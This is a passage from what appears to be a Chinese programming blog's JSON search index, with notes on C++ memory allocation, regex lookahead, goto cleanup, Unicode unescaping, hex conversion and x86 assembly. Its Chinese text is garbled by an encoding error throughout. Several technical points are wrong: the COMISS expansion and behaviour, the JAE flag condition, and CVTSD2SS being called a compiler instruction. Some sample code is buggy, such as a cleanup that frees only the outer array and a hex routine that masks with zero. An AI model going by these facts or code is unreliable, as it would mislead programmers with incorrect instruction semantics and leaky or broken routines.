è½¬æ¢æ–‡ä»¶ï¼š win_str_utils win_str_utils.md","tags":[{"name":"cpp/String","slug":"cpp-String","permalink":"https://hodlyounger.github.io/tags/cpp-String/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"C++å†…å­˜åˆ†é…","date":"2023-10-27T01:24:02.097Z","path":"B_Code/CPP/ã€CPPã€‘å†…å­˜åˆ†é…/","text":"C++ ç¨‹åºè¿è¡ŒæœŸé—´å†…å­˜åˆ†é…æ•´ç† [toc] new å†…å­˜åˆ†é… åœ¨C++ä¸­ï¼Œä½¿ç”¨newå…³é”®å­—åˆ†é…çš„å†…å­˜æ˜¯åœ¨è™šæ‹Ÿå†…å­˜ä¸­ã€‚è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ç§æŠ½è±¡æ¦‚å¿µï¼Œå®ƒå…è®¸ç¨‹åºä»¥è¿ç»­ä¸”å›ºå®šå¤§å°çš„å†…å­˜åœ°å€ç©ºé—´è¿è¡Œï¼Œè€Œä¸ç®¡ç‰©ç†å†…å­˜çš„å®é™…é…ç½®å¦‚ä½•ã€‚ å½“ä½ ä½¿ç”¨newåœ¨C++ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡æˆ–æ•°ç»„æ—¶ï¼Œå†…å­˜ç®¡ç†å™¨ä¼šåœ¨å †å†…å­˜ä¸­åˆ†é…ä¸€å—ç©ºé—´ï¼Œå¹¶è¿”å›æŒ‡å‘è¿™å—ç©ºé—´çš„æŒ‡é’ˆã€‚å³ä½¿è¿™å—ç©ºé—´è¶…å‡ºäº†ç¨‹åºå½“å‰çš„å®é™…ç‰©ç†å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šé€šè¿‡é¡µé¢è°ƒåº¦å’Œå†…å­˜æ˜ å°„æœºåˆ¶æ¥ç¡®ä¿ç¨‹åºçš„æ­£ç¡®è¿è¡Œã€‚ å› æ­¤ï¼Œä½¿ç”¨newåˆ†é…çš„å†…å­˜æ˜¯åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä½†æ“ä½œç³»ç»Ÿä¼šæ ¹æ®ç‰©ç†å†…å­˜çš„å®é™…é…ç½®è¿›è¡Œç®¡ç†ã€‚","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"å†…å­˜åˆ†é…","slug":"å†…å­˜åˆ†é…","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€regexã€‘æ­£åˆ™è¡¨è¾¾å¼åå‘å¼•ç”¨","date":"2023-10-27T01:24:02.096Z","path":"B_Code/C/æ­£åˆ™è¡¨è¾¾å¼/ã€regexã€‘åŒ¹é…ä¸ç­‰äº/","text":"æ¦‚è¿°ï¼šæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ [^a]* è¡¨ç¤ºåŒ¹é…é™¤äº†aä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ [^abc]* è¡¨ç¤ºåŒ¹é…é™¤äº†aã€bã€cä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œæ³¨æ„è¿™é‡Œä¸æ˜¯abcå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯aã€bã€cä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½ä¸åŒ¹é… å½“æˆ‘ä»¬è¦ä¸åŒ¹é…æŸä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸­æ–‡è¯ç»„çš„æ—¶å€™ï¼Œå¯ä»¥è¿™æ ·ç”¨ ((?!å¤©ç©º).)* è¿™ä¸ªè¡¨ç¤ºåŒ¹é…å‡ºâ€™å¤©ç©ºâ€™ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ regex(?![0-9]+) åŒ¹é…ä¸æ˜¯regexï¼Œä½†åé¢ä¸æ˜¯æ•°å­—","tags":[{"name":"regex","slug":"regex","permalink":"https://hodlyounger.github.io/tags/regex/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"B-Code/C/æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/categories/B-Code/C/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"ã€C/C++ã€‘Gotoç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:02.095Z","path":"B_Code/C/ã€Cã€‘gotoå¦™ç”¨/","text":"æ¦‚è¿°ï¼šå¦‚ä½•å·§å¦™ä½¿ç”¨ goto Goto å¦™ç”¨ å½“ä¸€ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œå‡½æ•°è¦é€€å‡ºæ—¶ï¼Œå·²ç»ç”³è¯·çš„å†…å­˜æ²¡æœ‰é‡Šæ”¾ï¼Œä½†æ˜¯åˆéœ€è¦returnçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨goto ä»¥ä¸‹è¾¹çš„å‡½æ•°ä¸ºä¾‹ï¼Œåœ¨åˆ¤æ–­if(pRet[i] == NULL)æ—¶ï¼Œå¦‚æœä¸ºç©ºæ—¶ï¼Œå¦‚æœç›´æ¥returnçš„è¯ï¼Œé‚£ä¹ˆå·²ç»ç”³è¯·å†…å­˜çš„pRetåˆ™æˆäº†æµæµªå„¿ï¼Œæœªèƒ½å®Œå…¨é‡Šæ”¾ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å°±å¯ä»¥ä½¿ç”¨returnè¯­å¥ç›´æ¥è°ƒåˆ°ç¨‹åºçš„æœ«å°¾å»æ‰§è¡Œé‡Šæ”¾çš„æ“ä½œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 /* * @fn Merge * @brief æ ¹æ®è¾“å…¥çš„intå˜é‡æ±‚å…¶å¯¹åº”çš„hashå€¼ * @param[in] intervals: éœ€è¦åˆå¹¶çš„æ•°ç»„ intervalsSize: éœ€è¦åˆå¹¶çš„æ•°ç»„çš„å¤§å° intervalsColSize: éœ€è¦åˆå¹¶çš„æ•°ç»„çš„æ•°é‡ * @param[out] returnSize: åˆå¹¶åŒºé—´åæ•°ç»„çš„å¤§å° returncolumnSizes: åˆå¹¶åŒºé—´åæ•°ç»„çš„æ•°é‡ * @return int: æ ¹æ®å“ˆå¸Œç”Ÿæˆçš„keyå€¼ * * @detail * @date 2021-7-20 */int** Merge(_In_ int** intervals, _In_ int intervalsSize, _In_ int* intervalsColSize, _Out_ int* returnSize, _Out_ int** returnColumnSizes)&#123; // å¦‚æœåªæœ‰ä¸€ä¸ªåŒºé—´ï¼Œç›´æ¥è¿”å› TODO:æœ‰å¿…è¦çš„æƒ…å†µä¸‹-ã€‹ç”³è¯·å†…å­˜ if(intervalsSize == 1) &#123; return intervals; &#125; int nItem = 0; // ç¬¬ä¸€ä¸ªå…ƒç´ ä»å°åˆ°å¤§æ’åºï¼›å¦‚æœç¬¬ä¸€ä¸ªå…ƒç´ ç›¸ç­‰ï¼Œåˆ™æ ¹æ®ç¬¬äºŒä¸ªå…ƒç´ ä»å°åˆ°å¤§æ’åº qsort(intervals, intervalsSize, sizeof(int *), Compare); int **pRet = (int**)malloc(sizeof(int*)*ARRSIZE_MAX_N); if(pRet == NULL) &#123; return NULL; &#125; // å®šä¹‰è¿”å›æŒ‡é’ˆ for(int i=0; i&lt;intervalsSize; i++) &#123; pRet[i] = (int*)malloc(sizeof(int)*intervalsColSize[0]); if(pRet[i] == NULL) &#123;- return NULL;+ goto END; &#125; memset(pRet[i],0,sizeof(int)*intervalsColSize[0]); &#125; // å…ˆå°†ç¬¬ä¸€ä¸ªåŒºé—´å­˜å…¥ pRet[nItem][0] = intervals[0][0]; pRet[nItem][1] = intervals[0][1]; //éå†åˆå¹¶åˆ°pRet for(int i=0; i &lt; intervalsSize; i++) &#123; // å½“å‰åŒºé—´èµ·ç‚¹å°äºåˆå¹¶åŒºé—´ç»ˆç‚¹-ã€‹è¦†ç›– if(intervals[i][0] &lt;= pRet[nItem][1] &amp;&amp; intervals[i][1] &gt;= pRet[nItem][1]) &#123; pRet[nItem][1] = intervals[i][1]; &#125; // å½“å‰åŒºé—´çš„èµ·ç‚¹å¤§äºåˆå¹¶åŒºé—´çš„ç»ˆç‚¹-ã€‹ä¸‹ä¸€èŠ‚ç‚¹ else if(intervals[i][0] &gt; pRet[nItem][1]) &#123; (nItem)++; pRet[nItem][0] = intervals[i][0]; pRet[nItem][1] = intervals[i][1]; &#125; &#125; // è¿”å›ç»“æœ *returnSize = nItem + 1; *returnColumnSizes = intervalsColSize; return pRet;// Issue+END:+ free(pRet);+ return NULL;&#125;","tags":[{"name":"Code/C","slug":"Code-C","permalink":"https://hodlyounger.github.io/tags/Code-C/"},{"name":"C","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"}]},{"title":"ã€ç¼–è§£ç ã€‘Unicodeè§£ç ","date":"2023-10-27T01:24:02.094Z","path":"B_Code/C/ã€ç¼–è§£ç ã€‘Unicodeè§£ç /","text":"æ¦‚è¿°ï¼šUnicodeè§£ç  å‚è€ƒæ–‡ç« ï¼š windowsä¸‹Cå®ç°Unicodeå’ŒUtf8ç¼–ç çš„äº’è½¬_c unicodeè½¬utf-8-CSDNåšå®¢ C / C++ å¤„ç†è½¬ä¹‰ \\uxxxx å­—ç¬¦-CSDNåšå®¢ å‰è¨€ ç”±äºå‰åç«¯äº¤äº’ä¸­ç¼–ç çš„é—®é¢˜ï¼Œå‡ºç°äº†è¿™æ ·çš„ä¸€ä¸²å­—ç¬¦ï¼š 1&#123;&quot;share_names&quot;:[&quot;\\u4e2d\\u6587\\u8def\\u5f84&quot;]&#125; å‡ºç°äº†unicodeç¼–ç ä½œä¸ºå­—ç¬¦ä¸²å†…å®¹çš„æƒ…å†µï¼Œç›´æ¥ç”¨jsonè§£æçš„è¯ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åœ¨jsonè§£æå‰éœ€è¦å…ˆè¿›è¡Œè½¬ç ï¼Œä¸¤ç§æ–¹æ¡ˆ æ‰€æœ‰çš„ ASCII ç¼–ç è½¬ä¸º UNICODE æ‰€æœ‰ UNICODE è½¬ä¸º ASCII å¸¸è§„æ€ç»´å°±æ˜¯ UNICODE è½¬ä¸º ASCIIã€‚ æ€è·¯ UNICODE ç¼–ç å ç”¨äº†ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åœ¨å¤„ç†æ—¶éœ€è¦ä½¿ç”¨å®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ wchar_t æˆ–è€… wstringã€‚ ç‰¹å¾ï¼š UNICODE çš„ç¼–ç æ ¼å¼å›ºå®šï¼š\\udddd çš„å½¢å¼ã€‚ æ­¥éª¤è¯´æ˜ï¼š éå†æ•´ä¸ªå­—ç¬¦ä¸² å‘ç° \\\\u åˆ™è¯»å–å¯¹åº”çš„ dddd ä¿å­˜ dddd åˆ°å®½å­—ç¬¦ä¸²ä¸­ã€‚éœ€è¦æŒ‰ç…§ 16 è¿›åˆ¶è¯»å–ã€‚ ä»£ç  C++ç‰ˆæœ¬ 12345678910111213141516string Unescape(const string&amp; input) &#123; wstring wresult; for (size_t i = 0; i &lt; input.length(); ) &#123; if (input[i] == &#x27;\\\\&#x27; &amp;&amp; input[i + 1] == &#x27;u&#x27;) &#123; string code = input.substr(i + 2, 4); wchar_t unicode = stoi(code, nullptr, 16); wresult += unicode; i += 6; &#125; else &#123; wresult += input[i++]; &#125; &#125; wstring_convert&lt;codecvt_utf8&lt;wchar_t&gt;&gt; conv; string result = conv.to_bytes(wresult); return result;&#125; ATLç‰ˆæœ¬ 123456789101112131415161718CString Unescape(const CString&amp; csInput) &#123; string input = CW2A(csInput); wstring wresult; for (size_t i = 0; i &lt; input.length(); ) &#123; if (input[i] == &#x27;\\\\&#x27; &amp;&amp; input[i + 1] == &#x27;u&#x27;) &#123; string code = input.substr(i + 2, 4); wchar_t unicode = stoi(code, nullptr, 16); wresult += unicode; i += 6; &#125; else &#123; wresult += input[i++]; &#125; &#125; CString csResult; csResult.Format(L&quot;%s&quot;, wresult); return csResult;&#125; è¡¥å…… å¦‚æœç›´æ¥ä½¿ç”¨ C++ string æ„é€ çš„è¯ï¼Œå°±èƒ½æ­£ç¡®è¯†åˆ«åå…­è¿›åˆ¶ä¸­æ–‡å­—ç¬¦ 123456789101112#include &lt;iostream&gt;using namespace std;int main() &#123; string jsonStr = &quot;&#123;\\&quot;share_names\\&quot;:[\\&quot;\\u4e2d\\u6587\\u8def\\u5f84\\&quot;]&#125;&quot;; cout &lt;&lt; jsonStr &lt;&lt; endl; cout &lt;&lt; &quot;â‰¡ is the same as \\u2261&quot; &lt;&lt; endl; string s(&quot;â‰¡ is the same as \\u2261&quot;); cout &lt;&lt; s &lt;&lt; endl;&#125;","tags":[{"name":"Code/C","slug":"Code-C","permalink":"https://hodlyounger.github.io/tags/Code-C/"},{"name":"Unicode","slug":"Unicode","permalink":"https://hodlyounger.github.io/tags/Unicode/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"}]},{"title":"ã€ç¼–è§£ç ã€‘Hexä¸Byteç›¸äº’è½¬åŒ–","date":"2023-10-27T01:24:02.093Z","path":"B_Code/C/ã€Cã€‘HexToByte/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡ä¸»è¦è®°å½•å®ç° 16è¿›åˆ¶ä¸å­—ç¬¦ä¸²äº’ç›¸è½¬æ¢çš„é€»è¾‘ä¸å®ç° å‚è€ƒåšå®¢ï¼šCè¯­è¨€å¿«é€Ÿäº’è½¬HEXï¼ˆ16è¿›åˆ¶ï¼‰å’ŒåŸå§‹å­—ç¬¦ä¸²/æ•°ç»„ â€“ æ™¨æ—­çš„åšå®¢~ è¯´æ˜ 16è¿›åˆ¶æ ¼å¼ä¸º 0x00ã€0x01â€¦â€¦è¿™æ ·çš„å½¢å¼ åè¿›åˆ¶æ ¼å¼ä¸º 0ã€1ã€2â€¦â€¦ è¿™æ ·çš„å½¢å¼ ä¸»è¦å‚è€ƒ ASCIIç ä¸€è§ˆè¡¨ï¼ŒASCIIç å¯¹ç…§è¡¨ï¼Œå®ç°çš„å†…å®¹å°±æ˜¯ åè¿›åˆ¶åˆ°åå…­è¿›åˆ¶ çš„äº’ç›¸è½¬æ¢ å®ç° HexToByte 123456789101112131415161718192021222324#include &lt;stdio.h&gt;void from_hex(char *s, int l, char *d)&#123; while(l--) &#123; char* p = s+l; char* p2 = p-1; *(d+l/2) = ( (*p&gt;&#x27;9&#x27;? *p+9 : *p) &amp; 0x0f ) | ( (*p2&gt;&#x27;9&#x27;? *p2+9 : *p2) &lt;&lt; 4 ); l--; &#125;&#125;int main () &#123; char s[]= &quot;6F6B6f6b&quot;; char d[5]; d[4] = &#x27;\\0&#x27;; from_hex(s,8,d); printf(&quot;%s&quot;,d); return 0;&#125; ByteToHex 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;const char hex_table[] = &#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;&#125;;void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; *(d+2*l+1) = hex_table[(*(s+l))&amp;0x0f]; *(d+2*l) = hex_table[(*(s+l))&gt;&gt;4]; &#125;&#125;static voidbytesToHex(uint8 b[16], char *s)&#123; static const char *hex = &quot;0123456789abcdef&quot;; int q, w; for (q = 0, w = 0; q &lt; 16; q++) &#123; s[w++] = hex[(b[q] &gt;&gt; 4) &amp; 0x0F]; s[w++] = hex[b[q] &amp; 0x0F]; &#125; s[w] = &#x27;\\0&#x27;;&#125;int main () &#123; char s[]= &quot;1234abcd&quot;; char d[1024]; d[8] = &#x27;\\0&#x27;; to_hex(s,sizeof(s)/sizeof(char) - 1,d); printf(&quot;%s&quot;,d); return 0;&#125; å…³äº ASCII è½¬ HEX æˆ‘æå‡ºä¸€ç‚¹é—®é¢˜ï¼Œåœ¨ https://www.onlinegdb.com/ åœ¨çº¿ç¼–è¯‘ï¼Œè¿è¡Œä¸Šè¿°ä»£ç ï¼Œç¼–è¯‘å¾—åˆ°çš„ç»“æœç•¥å¾®æœ‰ç‚¹é—®é¢˜ï¼š 13132333461626364 å¯ä»¥çœ‹åˆ°å°äº 10 çš„æ•°å­—çš„ç¬¬ä¸€ä½éƒ½è¢«3å¡«å……äº†ã€‚å¯èƒ½æ˜¯å› ä¸ºæ ˆç©ºé—´é»˜è®¤åˆå§‹åŒ–çš„æ—¶å€™éƒ½æ˜¯è¢« 0x00000011 è¿™æ ·çš„æ•°æ®å¡«å……çš„ã€‚ç¨å¾®ä¿®æ”¹äº†ä¸‹ï¼ŒåŠ äº†ä¸ªåˆ¤æ–­å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; if(*s &gt; &#x27;9&#x27;) *d = hex_table[(*s &gt;&gt; 4) &amp; 0x0f]; else *d = hex_table[(*s &gt;&gt; 4) &amp; 0x00]; d++; *d = hex_table[*s &amp; 0x0f]; s++; d++; &#125;&#125; ä¸€ç§æ›´é«˜æ•ˆçš„å®ç°ï¼š 12345678910111213141516171819202122#include &lt;stdio.h&gt;void from_hex(char *s, int l, char *d)&#123; while(l--) &#123; *d = (*s&gt;&#x27;9&#x27; ? *s+9 : *s) &lt;&lt; 4; ++s; *d |= (*s&gt;&#x27;9&#x27; ? *s+9 : *s) &amp; 0x0F; ++s; ++d; &#125;&#125;int main () &#123; char s[]= &quot;6F6B6f6b&quot;; char d[5]; d[4] = &#x27;\\0&#x27;; from_hex(s,4,d); printf(&quot;%s&quot;,d); return 0;&#125; 123456789101112131415161718192021222324#include &lt;stdio.h&gt;const char hex_table[] = &#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;&#125;;void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; *d = hex_table[*s &gt;&gt; 4 &amp; 0]; d++; *d = hex_table[*s &amp; 0x0f]; s++; d++; &#125;&#125;int main () &#123; char s[]= &quot;1234&quot;; char d[9]; d[8] = &#x27;\\0&#x27;; to_hex(s,4,d); printf(&quot;%s&quot;,d); return 0;&#125;","tags":[{"name":"Code/C","slug":"Code-C","permalink":"https://hodlyounger.github.io/tags/Code-C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"}]},{"title":"ã€æ±‡ç¼–ã€‘å‘½ä»¤æ•´ç†","date":"2023-10-27T01:24:02.092Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘åŸºç¡€å‘½ä»¤/","text":"æ¦‚è¿°: æ±‡ç¼–å‘½ä»¤æ•´ç† [toc] COMISS COMISSï¼ˆCompare Or Ordered Move SIMD Singleï¼‰æŒ‡ä»¤æ˜¯x86æŒ‡ä»¤é›†ä¸­çš„ä¸€æ¡æ¯”è¾ƒæŒ‡ä»¤ï¼Œç”¨äºæ¯”è¾ƒä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°æˆ–å•ç²¾åº¦å¯„å­˜å™¨ï¼Œå¹¶è®¾ç½®æ ‡å¿—ä½ã€‚å®ƒä¹Ÿå¯ä»¥å°†æ¯”è¾ƒç»“æœç§»åŠ¨åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ã€‚ å…·ä½“æ¥è¯´ï¼ŒCOMISSæŒ‡ä»¤å°†ä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°æˆ–å•ç²¾åº¦å¯„å­˜å™¨è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è®¾ç½®æ ‡å¿—ä½ZFï¼ˆZero Flagï¼Œé›¶æ ‡å¿—ä½ï¼‰ã€PFï¼ˆParity Flagï¼Œå¥‡å¶æ ‡å¿—ä½ï¼‰å’ŒCFï¼ˆCarry Flagï¼Œè¿›ä½æ ‡å¿—ä½ï¼‰ã€‚å®ƒå¯ä»¥å°†æ¯”è¾ƒç»“æœç§»åŠ¨åˆ°ç›®æ ‡å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹æ˜¯ä¸€æ¡COMISSæŒ‡ä»¤çš„ç¤ºä¾‹ä»£ç ï¼š 123å¤åˆ¶ä»£ç comiss xmm1, xmm2 ; æ¯”è¾ƒxmm1å’Œxmm2å¯„å­˜å™¨ä¸­çš„å•ç²¾åº¦æµ®ç‚¹æ•° è¯¥æŒ‡ä»¤ä¼šå°†ä¸¤ä¸ªå¯„å­˜å™¨ä¸­çš„å•ç²¾åº¦æµ®ç‚¹æ•°è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æ ‡å¿—ä½ã€‚ç„¶åï¼Œå¯ä»¥å°†æ¯”è¾ƒç»“æœç§»åŠ¨åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCOMISSæŒ‡ä»¤åªèƒ½ç”¨äºå•ç²¾åº¦æµ®ç‚¹æ•°çš„æ¯”è¾ƒï¼Œä¸èƒ½ç”¨äºåŒç²¾åº¦æµ®ç‚¹æ•°çš„æ¯”è¾ƒã€‚ CVTSD2SS CVTSD2SS æ˜¯ Intel C/C++ ç¼–è¯‘å™¨çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œç”¨äºå°† 64 ä½åŒç²¾åº¦æµ®ç‚¹æ•°è½¬æ¢ä¸º 32 ä½å•ç²¾åº¦æµ®ç‚¹æ•°ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œæºæ“ä½œæ•°ï¼ˆSRCï¼‰è¢«è¯»å–å¹¶è½¬æ¢ä¸º 32 ä½å•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç„¶åå­˜å‚¨åœ¨ç›®æ ‡æ“ä½œæ•°ï¼ˆDESTï¼‰ä¸­ã€‚ æ³¨æ„ï¼Œä»¥ä¸Šä¿¡æ¯ä»…ä¾›å‚è€ƒã€‚åœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œå¦‚æœä½ ä½¿ç”¨ CVTSD2SS æŒ‡ä»¤ï¼Œä½ éœ€è¦å‚è€ƒ Intel å¤„ç†å™¨çš„æ¶æ„å’Œç›¸å…³æ–‡æ¡£ï¼Œä»¥ç¡®ä¿ä½ çš„ä»£ç å¯ä»¥åœ¨ç›®æ ‡ç¡¬ä»¶ä¸Šæ­£ç¡®æ‰§è¡Œã€‚ JAE åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼ŒJAEï¼ˆJump if Above or Equalï¼‰æŒ‡ä»¤æ˜¯ä¸€ç§æ ¹æ®æ— ç¬¦å·æ•´æ•°æ¯”è¾ƒçš„ç»“æœè¿›è¡Œæ¡ä»¶è½¬ç§»çš„æŒ‡ä»¤ã€‚ å½“CFï¼ˆCarry Flagï¼‰ä¸º0ä¸”ZFï¼ˆZero Flagï¼‰ä¸º0æ—¶ï¼Œè¡¨ç¤ºå‰é¢çš„æ“ä½œç»“æœæ˜¯æ— ç¬¦å·æ•´æ•°å¤§äºï¼ˆAboveï¼‰æˆ–ç­‰äºï¼ˆEqualï¼‰çš„æƒ…å†µï¼Œæ­¤æ—¶æ‰§è¡Œè·³è½¬æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå‡è®¾å½“å‰æŒ‡ä»¤çš„åœ°å€ä¸º0x1000ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä¸º0x1001ï¼Œè€ŒæŸä¸ªæ— ç¬¦å·æ•´æ•°çš„æ¯”è¾ƒç»“æœä½¿å¾—CFä¸º0ä¸”ZFä¸º0ï¼Œé‚£ä¹ˆæ‰§è¡ŒJAEæŒ‡ä»¤åï¼Œç¨‹åºå°†ä¼šè·³è½¬åˆ°åœ°å€0x1001å¤„æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…·ä½“çš„æŒ‡ä»¤ç”¨æ³•å’Œè¯­æ³•å¯èƒ½ä¼šå› ä¸ºä¸åŒçš„æ±‡ç¼–è¯­è¨€è€Œç•¥æœ‰ä¸åŒï¼Œå…·ä½“éœ€è¦å‚è€ƒå¯¹åº”çš„æ±‡ç¼–è¯­è¨€æ–‡æ¡£æˆ–æ‰‹å†Œã€‚ JE åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼ŒJEæŒ‡ä»¤å…¨ç§°ä¸ºâ€œJump if Equalâ€ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œJump if Zeroâ€ã€‚å®ƒæ ¹æ®æ ‡å¿—å¯„å­˜å™¨ä¸­çš„é›¶æ ‡å¿—ä½(ZF)çš„å€¼æ¥åˆ¤æ–­æ˜¯å¦è¿›è¡Œè·³è½¬ã€‚å½“ZFä¸º1æ—¶ï¼Œè¡¨ç¤ºå‰é¢çš„æ“ä½œç»“æœä¸ºé›¶ï¼Œåˆ™è·³è½¬åˆ°ç›®æ ‡åœ°å€æ‰§è¡Œï¼›å½“ZFä¸º0æ—¶ï¼Œåˆ™ä¸è¿›è¡Œè·³è½¬ã€‚ JP åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼ŒJPï¼ˆJump if Parityï¼‰æŒ‡ä»¤æ˜¯ä¸€ç§æ ¹æ®å¥‡å¶æ ‡å¿—ä½PFï¼ˆParity Flagï¼‰çš„çŠ¶æ€è¿›è¡Œè·³è½¬çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€‚ å½“PFä¸º1æ—¶ï¼Œè¡¨ç¤ºå‰é¢æ“ä½œçš„ç»“æœå…·æœ‰å¶æ•°ä¸ª1ä½ï¼ˆå³ä½8ä½æœ‰å¶æ•°ä¸ª1ï¼‰ï¼Œæ­¤æ—¶æ‰§è¡Œè·³è½¬æ“ä½œï¼›å½“PFä¸º0æ—¶ï¼Œè¡¨ç¤ºå‰é¢æ“ä½œçš„ç»“æœå…·æœ‰å¥‡æ•°ä¸ª1ä½ï¼ˆå³ä½8ä½æœ‰å¥‡æ•°ä¸ª1ï¼‰ï¼Œæ­¤æ—¶ä¸æ‰§è¡Œè·³è½¬æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå‡è®¾å½“å‰æŒ‡ä»¤çš„åœ°å€ä¸º0x1000ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä¸º0x1001ï¼Œè€ŒæŸä¸ªæ“ä½œçš„ç»“æœä½¿å¾—PFä¸º1ï¼Œé‚£ä¹ˆæ‰§è¡ŒJPæŒ‡ä»¤åï¼Œç¨‹åºå°†ä¼šè·³è½¬åˆ°åœ°å€0x1001å¤„æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…·ä½“çš„æŒ‡ä»¤ç”¨æ³•å’Œè¯­æ³•å¯èƒ½ä¼šå› ä¸ºä¸åŒçš„æ±‡ç¼–è¯­è¨€è€Œç•¥æœ‰ä¸åŒï¼Œå…·ä½“éœ€è¦å‚è€ƒå¯¹åº”çš„æ±‡ç¼–è¯­è¨€æ–‡æ¡£æˆ–æ‰‹å†Œã€‚ DD DD ä½œä¸ºä¼ªæ“ä½œå‘½ä»¤ï¼Œç”¨äºå®šä¹‰æ“ä½œæ•°å ç”¨çš„å­—èŠ‚æ•°ï¼Œå³DoubleWordçš„ç¼©å†™ï¼Œè¡¨ç¤º4ä¸ªå­—èŠ‚ï¼ˆ32ä½ï¼‰ã€‚ movaps 